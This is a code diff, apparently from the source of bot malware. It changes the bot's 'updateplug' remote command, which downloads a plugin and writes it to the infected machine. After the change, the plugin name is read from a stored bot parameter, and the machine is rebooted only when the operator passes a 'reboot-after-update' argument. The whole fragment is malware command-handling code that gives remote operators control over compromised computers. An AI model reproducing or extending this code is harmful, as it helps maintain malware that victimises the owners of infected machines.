@@ -834,9 +834,11 @@ const char* Plugin::CommandUpdatePlug = "updateplug";
 
 bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
+	CHAR  PlugName[MAX_BOT_PLUG_NAME_SIZE];
+
 	PDBG("Plugins", "ExecuteUpdatePlug: '%s'", Args);
 	
-	PCHAR  PlugName = Args;
+	GetBotParameter(BOT_PARAM_BOTPLUGNAME, PlugName, ARRAYSIZE(PlugName) - 1);
 
 	DWORD  CachedFileSize = 0;
 	LPBYTE CachedFile = DownloadFromCache(PlugName, true, NULL, &CachedFileSize);
@@ -889,8 +891,14 @@ bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
 		// Не получилось записать.
 		if (written == 0) break;
 
-		PDBG("Plugins", "ExecuteUpdatePlug: start machine reboot.");
-		Reboot();
+		STR::AnsiLowerCase(Args);
+
+		PDBG("Plugins", "ExecuteUpdatePlug: checking reboot argument ('%s').", Args);
+		if (m_lstrcmp(Args, "reboot-after-update") == 0) 
+		{
+			PDBG("Plugins", "ExecuteUpdatePlug: reboot argument specified. ('%s').", Args);
+			Reboot();
+		}
 
 		return true;
 	}
